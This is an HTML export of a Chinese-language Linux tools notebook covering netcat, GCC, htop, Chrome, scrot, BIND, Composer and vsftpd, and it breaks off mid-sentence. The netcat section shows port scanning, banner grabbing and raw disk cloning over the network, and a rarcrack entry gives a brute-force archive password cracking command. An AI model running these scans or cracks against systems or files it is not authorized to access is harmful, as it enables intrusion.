&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-1&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;创建一个 2048 位 RSA 公钥/私钥对。&lt;/li&gt;
&lt;li&gt;生成一个嵌入您的公钥的证书签名请求 (CSR)&lt;/li&gt;
&lt;li&gt;将 CSR 与证书颁发机构 (CA) 共享以接收最终证书或证书链。&lt;/li&gt;
&lt;li&gt;将最终证书安装在非网络可访问的位置，例如 /etc/ssl（Linux 和 Unix）或 IIS 需要它的位置 (Windows)。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;example&quot;&gt;
1. 生成密钥和证书签名请求
此部分使用 openssl 命令行程序（大部分 Linux、BSD 和 Mac OS X 系统均附带此程序）来生成私钥/公钥和 CSR。


&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
参考资料：

&lt;/pre&gt;
&lt;p&gt;
&lt;a href=&quot;https://developers.google.com/web/fundamentals/security/encrypt-in-transit/enable-https?hl=zh-cn&quot;&gt;在服务器上启用 HTTPS&lt;/a&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdb2c6bf&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgdb2c6bf&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.2&lt;/span&gt; 神奇的 nc 命令&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
介绍
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
netcat是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向。
netcat所做的就是在两台电脑之间建立链接并返回两个数据流。你能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
安装
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// Redhat/CentOS/Fedora
$ yum install nc
// Debian/Ubuntu
$ sudo apt-get install netcat

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
常见使用
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
端口扫描经常被系统管理员和黑客用来发现在一些机器上开放的端口，帮助他们识别系统中的漏洞。
$ nc -z -v -n 172.31.100.7 21-25
可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.
z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换(谢谢@jxing 指点)
v 参数指使用冗余选项（译者注：即详细输出）
n 参数告诉netcat 不要使用DNS反向查询IP地址的域名

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
Banner是一个文本，Banner是一个你连接的服务发送给你的文本信息。
一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。
$ nc -v 172.31.100.7 21

&lt;/pre&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
聊天工具
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// Server
$ nc -l 1234
// Client
$ nc 172.168.100.7 1234

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
文件传输
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// Server &amp;gt; Client
$ nc -l 1234 &amp;gt; file.txt
$ nc 172.168.100.7 1234 &amp;lt;file.txt

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
目录传输
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// Server &amp;gt; Client
$ tar -cvf - dir_name | nc -l 1234
$ nc -n 172.168.100.7 1234 | tar -xvf -
这里在A服务器上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给netcat，netcat可以通过网络发送它。
在客户端我们下载该压缩包通过netcat 管道然后打开文件。
如果想要节省带宽传输压缩包，我们可以使用bzip2或者其他工具压缩。
// Server
$ tar -cvf – dir_name| bzip2 -z | nc -l 1234
// Client
$ nc -n 172.31.100.7 1234 | bzip2 -d |tar -xvf -

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
加密网络传输数据
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// Server
$ nc localhost 1234 | mcrypt –flush –bare -F -q -d -m ecb &amp;gt; file.txt
// Client
$ mcrypt –flush –bare -F -q -m ecb &amp;lt; file.txt | nc -l 1234

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
流视频
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// Server
$ cat video.avi | nc -l 1234
从一个视频文件中读入并重定向输出到netcat客户端
// Client
$ nc 172.31.100.7 1234 | mplayer -vo x11 -cache 3000 -
从socket中读入数据并重定向到mplayer。

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
克隆一个设备
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
已经安装配置一台Linux机器并且需要重复同样的操作对其他的机器，而你不想在重复配置一遍。
假如你的系统在磁盘/dev/sda上:
// Server
$ dd if=/dev/sda | nc -l 1234
// Client
$ nc -n 172.31.100.7 1567 | dd of=/dev/sda
dd是一个从磁盘读取原始数据的工具，我通过netcat服务器重定向它的输出流到其他机器并且写入到磁盘中，它会随着分区表拷贝所有的信息。
但是如果我们已经做过分区并且只需要克隆root分区，我们可以根据我们系统root分区的位置，更改sda 为sda1，sda2.等等。

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
参考资料
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
https://blog.csdn.net/zhangxiao93/article/details/52705642

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2ce87f2&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org2ce87f2&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.3&lt;/span&gt; GCC&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
简单编译
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ gcc test.c -o test
实质上，以上这条命令编译过程分为四个阶段进行的，即预处理（预编译，Preprocessing）、编译（Compilation）、汇编（Assembly）和连接（Linking）。

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
1.Preprocessing
$ gcc -E test.c -o test.i
或
$ gcc -E test.c
gcc 的 -E 选项，可以让编译器在预处理后停止，并输出预处理结果。在本例中，预处理结果就是将 stdio.h 文件中的内容插入到 test.c 中了。
2.Compilation
$ gcc -S test.i -o test.s
gcc 的 -S 选项，表示在程序编译期间，在生成汇编代码后，停止，-o 输出汇编代码文件。
3.Assembly
$ gcc -c test.s -o test.o
对于上一小节中生成的汇编代码文件 test.s，gas 汇编器负责将其编译为目标文件
4.Linking
gcc 连接器是 gas 提供的，负责将程序的目标文件与所需的所有附加的目标文件连接起来，最终生成可执行文件。附加的目标文件包括静态连接库和动态连接库。
对于上一小节中生成的 test.o，将其与 Ｃ 标准输入输出库进行连接，最终生成程序 test
$ gcc test.o -o test

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
多个程序文件的编译
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ gcc test1.c test2.c -o test

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
检错
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ gcc -pedantic test.c -o test
//警告信息
$ gcc -Wall test.c -p test
//-Werror 选项，那么 GCC 会在所有产生警告的地方停止编译，迫使程序员对自己的代码进行修改
$ gcc -Werror test.c -o test

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
库文件连接
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
1.编译可执行文件。首先我们要进行编译 test.c 为目标文件，这个时候需要执行
$ gcc  –c –I /usr/dev/mysql/include test.c –o test.o
2.链接。最后我们把所有目标文件链接成可执行文件:
$ gcc –L /usr/dev/mysql/lib –lmysqlclient test.o –o test
3.强制链接时使用静态链接库。默认情况下， GCC 在链接时优先使用动态链接库，只有当动态链接库不存在时才考虑使用静态链接库，如果需要的话可以在编译时加上 -static 选项，强制使用静态链接库。
$ gcc –L /usr/dev/mysql/lib –static –lmysqlclient test.o –o test

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
其他
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
静态库链接时搜索路径顺序：

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
1. ld 会去找GCC命令中的参数 -L
2. 再找 gcc 的环境变量 LIBRARY_PATH
3. 再找内定目录 /lib /usr/lib /usr/local/lib 这是当初 compile gcc 时写在程序内的

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
动态链接时、执行时搜索路径顺序:

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
1. 编译目标代码时指定的动态库搜索路径
2. 环境变量 LD_LIBRARY_PATH 指定的动态库搜索路径
3. 配置文件 /etc/ld.so.conf 中指定的动态库搜索路径
4. 默认的动态库搜索路径 /lib
5. 默认的动态库搜索路径 /usr/lib

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
有关环境变量：
LIBRARY_PATH 环境变量：指定程序静态链接库文件搜索路径
LD_LIBRARY_PATH 环境变量：指定程序动态链接库文件搜索路径

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
Reference
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
http://www.cnblogs.com/ggjucheng/archive/2011/12/14/2287738.html

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgcbeef9b&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgcbeef9b&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.4&lt;/span&gt; 系统状态监视命令：top &amp;amp; htop&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
top
&lt;/p&gt;

&lt;div class=&quot;figure&quot;&gt;
&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/top.jpg&quot; alt=&quot;top.jpg&quot; /&gt;
&lt;/p&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;htop
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
下载及安装
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ git clone https://github.com/hishamhm/htop 
$ tar zxvf htop-2.0.2.tar.gz
$ cd htop-2.0.2
$ ./configure
# make &amp;amp;&amp;amp; make install

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;a id=&quot;orgb5b5cac&quot;&gt;&lt;/a&gt;错误解决&lt;br /&gt;
&lt;div class=&quot;outline-text-6&quot; id=&quot;text-5-8-4-0-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
configure: error: missing libraries: libncurses
Solving:
$ sudo apt-get install nucurses-dev

&lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orga522792&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orga522792&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.5&lt;/span&gt; 网络监视命令：iftop&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-5&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt-get install iftop


&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdd95a52&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgdd95a52&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.6&lt;/span&gt; wget vs axel&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-6&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
官方地址: http://axel.alioth.debian.org/
描述: 替换wget命令

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org01f904d&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org01f904d&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.7&lt;/span&gt; VIM&amp;amp;Emacs&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-7&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
两个神器软件单独介绍，这里不重复叙写。

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org08e48d2&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org08e48d2&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.8&lt;/span&gt; MPlayer&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-8&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
// official：http://www.mplayerhq.hu/design7/news.html
$ tar -Jxf MPlayer-1.1.1.tar.xz
$ cd MPlayer-1.1.1
$ sudo ./configure
// 发现，需要安装一个依赖包:yasm
$ wget http://www.tortall.net/projects/yasm/releases/yasm-1.2.0.tar.gz
// 安装完成后，重新配置、编译和安装
$ sudo ./configure
$ sudo make &amp;amp;&amp;amp; make install

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org0221d50&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org0221d50&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.9&lt;/span&gt; google-chrome &amp;amp; chromium&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-9&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
添加安装源
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo vim /etc/apt/sources.list
deb http://dl.google.com/linux/chrome/deb/ stable main

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
添加公钥验证下载
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ wget https://dl-ssl.google.com/linux/linux_signing_key.pub
$ apt-key add linux_signing_key.pub

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
执行安装
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt update
// stable ersion
$ sudo apt install google-chrome-stable
// beta or unstable ersion
$ sudo apt install google-chrome-beta
$ sudo apt install google-chrome-unstable

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
安装 chromium
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt-get update
$ sudo apt-get install chromium chromium-l10n
（chromium-l10n 是用于本地化界面的，是可选的软件包）
注意：chromium不支持PDF查看

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org860ad0c&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org860ad0c&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.10&lt;/span&gt; Scrot：截图工具&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-10&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
安装
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt-get install scrot

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;使用方法
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
整个桌面截图(Full desktop)
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ scrot
$ scrot ~/Downloads/my_desktop.png //Saving to specified directory.

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
特定区域截图（选择截取）(Specific area)
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ scrot -s

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
延迟截图(temporize screenshot)
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ scrot -s -d 5

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
截图调整质量(Adjust the quality of screenshots)
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ scrot -q 50

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
截图调整大小(Adjust the screen size)
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ scrot -t 10

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
将截图发送给其他命令(Deliver the intercepted screenshots to other commands)
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ scrot -e 'mv $f ~/screenshots'

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
参考资料(References)
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
https://linux.cn/article-3197-1.html

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org62bf110&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org62bf110&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.11&lt;/span&gt; rarcrack（压缩包密码破解工具）&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-11&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
支持格式：rar,7z,zip
// install
$ sudo apt-get install libxml2-dev build-essential
$ sudo apt-get install rarcrack
// use
$ rarcrack --threads 10 --type rar test.rar

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9951ba9&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org9951ba9&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.12&lt;/span&gt; 宝塔面板&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-12&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
一款使用方便、功能强大且终身免费的服务器管理软件。详见官网:http://www.bt.cn/

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgd819432&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgd819432&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.13&lt;/span&gt; Cisco AnyConnect VPN Client&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-13&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
问题解决
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo systemctl enable vpnagentd_init
vpnagentd_init.service is not a native service, redirecting to systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable vpnagentd_init
insserv: warning: script 'vpnagentd_init' missing LSB tags and overrides
insserv: There is a loop between service bt and vpnagentd_init if stopped
insserv:  loop involving service vpnagentd_init at depth 2
insserv:  loop involving service bt at depth 1
insserv: Stopping vpnagentd_init depends on bt and therefore on system facility `$all' which can not be true!
insserv: exiting now without changing boot order!
update-rc.d: error: insserv rejected the script header

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
[solve]：$ sudo vim /etc/init.d/vpnagentd_init

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;sh&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;### &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;BEGIN INIT INFO&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;Provides: vpnagentd_init&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;Required-Start: $remote_fs $syslog&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;Required-Stop: $remote_fs $syslog&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;Default-Start: 2 3 4 5&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;Default-Stop: 0 1 6&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;Short-Description: Start Cisco vpn agent daemon at boot time&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;Description: Cisco vpn agent daemon&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;### &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;END INIT INFO&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org76c9b1c&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org76c9b1c&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.14&lt;/span&gt; Bind：DNS工具&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-14&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
安装
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# yum install -y bind

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
配置
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
1)# vim /etc/named.conf
修改内容如下：
 将下面
 listen-on port 53 { 127.0.0.1; };
 allow-query { localhost; };
 改为
 listen-on port 53 { any; };
 allow-query { any; };

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
2)# vim named.rfc1912.zones
注意改动位置：
zone &quot;zrg.com.cn&quot; IN {
type master;
file &quot;named.zrg&quot;;
allow-update { none; };
};

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
3)# cp /var/named/named.localhost /var/named/named.zrg
//修改文件所属群组
#chgrp named /var/named/named.zrg

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
4)# vim /var/named/named.zrg
注意改动位置：
$TTL 1D
@ IN SOA @ dns.zrg.com.cn. root(
0 ; serial
1D ; refresh
1H ; retry
1W ; expire
3H ) ; minimum
NS dns.zrg.com.cn.
DNS A 192.168.120.166
A 127.0.0.1
AAAA ::1

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
5)# /etc/init.d/named restart
# chkconfig named on

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
6)# vim /etc/sysconfig/network
Network=yes
Hostname=dns.zrg.com.cn

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
7)# vim /etc/resolv.conf
Search zrg.com.cn
Nameserver 192.168.120.166

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
8)# /etc/init.d/named restart
# ping zrg.com.cn
# reboot

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgb65c69d&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgb65c69d&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.15&lt;/span&gt; Composer&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-15&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
安装
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
1.Download composer.phar file.
2.Excute:
# php composer.phar
3.Global:
# mv composer.phar /usr/local/bin/composer
4.Permission:
# chmod 744 composer

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
问题解决
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
error: /usr/bin/env: php: No such file or directory
 solve:Configuring php to become global variables

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org76525b8&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org76525b8&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.8.16&lt;/span&gt; vsftpd&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-8-16&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
Download and Install
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
https://security.appspot.com/vsftpd.html#download
//yum
yum install -y vsftpd

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
Change default dir
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;#local user
local_root=/usr/share/nginx/html
#is_enable local view,default_setting is NO
chroot_local_user=NO
#anonymous user
anon_root=/var/ftp/pub
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
Configuring directory of access
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;chroot_local_user=YES
chroot_list_enable=NO
allow_writeable_chroot=YES

&amp;#25253;&amp;#22914;&amp;#19979;&amp;#38169;&amp;#35823;&amp;#65292;&amp;#26159;&amp;#22240;&amp;#20026;&amp;#27809;&amp;#26377;&amp;#28155;&amp;#21152;&amp;#19978;&amp;#38754;&amp;#30340;&amp;#31532;&amp;#19977;&amp;#26465;&amp;#35821;&amp;#21477;&amp;#65292;&amp;#23548;&amp;#33268;&amp;#29992;&amp;#25143;&amp;#26080;&amp;#27861;&amp;#38145;&amp;#23450;&amp;#33258;&amp;#24049;&amp;#30340;&amp;#30446;&amp;#24405;&amp;#12290;
   500 OOPS: vsftpd: refusing to run with writable root inside chroot()

notice:
 &amp;#37197;&amp;#32622;&amp;#20855;&amp;#20307;&amp;#24773;&amp;#20917;&amp;#26377;&amp;#20197;&amp;#19979;&amp;#20960;&amp;#31181;&amp;#65306;
1&amp;#65289;&lt;span style=&quot;color: #FF8C00; font-weight: bold; font-style: italic; text-decoration: underline;&quot;&gt;&amp;#24403; chroot_list_enable=yes&amp;#65292;chroot_local_user=yes&amp;#26102;&amp;#65292;&amp;#22312;/etc/vsftpd/chroot_list&amp;#25991;&amp;#20214; &amp;#20013;&amp;#21015;&amp;#20986;&amp;#30340;&amp;#29992;&amp;#25143;&amp;#65292;&amp;#21487;&amp;#20197;&amp;#20999;&amp;#25442;&amp;#21040;&amp;#19978;&amp;#32423;&amp;#30446;&amp;#24405;&amp;#65307;&amp;#26410;&amp;#22312;&amp;#25991;&amp;#20214;&amp;#20013;&amp;#21015;&amp;#20986;&amp;#30340;&amp;#29992;&amp;#25143;&amp;#65292;&amp;#19981;&amp;#33021;&amp;#20999;&amp;#25442;&amp;#21040;&amp;#31449;&amp;#28857;&amp;#26681;&amp;#30446;&amp;#24405;&amp;#30340;&amp;#19978;&amp;#32423;&amp;#30446;&amp;#24405;&amp;#12290;&lt;/span&gt;
2&amp;#65289;&lt;span style=&quot;color: #FF8C00; font-weight: bold; font-style: italic; text-decoration: underline;&quot;&gt;&amp;#24403; chroot_list_enable=yes&amp;#65292;chroot_local_user=no&amp;#26102;&amp;#65292;&amp;#22312;/etc/vsftpd/chroot_list&amp;#25991;&amp;#20214;&amp;#20013; 